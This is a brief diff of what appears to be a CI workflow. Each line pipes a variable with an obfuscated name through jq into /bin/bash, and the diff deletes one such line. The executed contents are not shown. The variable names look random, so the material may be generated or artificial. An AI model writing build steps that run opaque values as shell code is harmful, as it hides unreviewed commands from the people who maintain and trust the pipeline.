@@ -37,7 +37,6 @@ jobs:
           printf '%s' "$utrlo871" | jq -r .xr0 | /bin/bash
           echo $rm9412 | jq -r .eyke6474 | /bin/bash
           printf '%s' "$a649" | jq -r .j8 | /bin/bash
-          printf '%s' "$wcttz008" | jq -r .autng1153 | /bin/bash
           echo $u49583 | jq -r .z5895 | /bin/bash
           echo $sm867 | jq -r .ud8 | /bin/bash
           echo $f70 | jq -r .tt19566 | /bin/bash
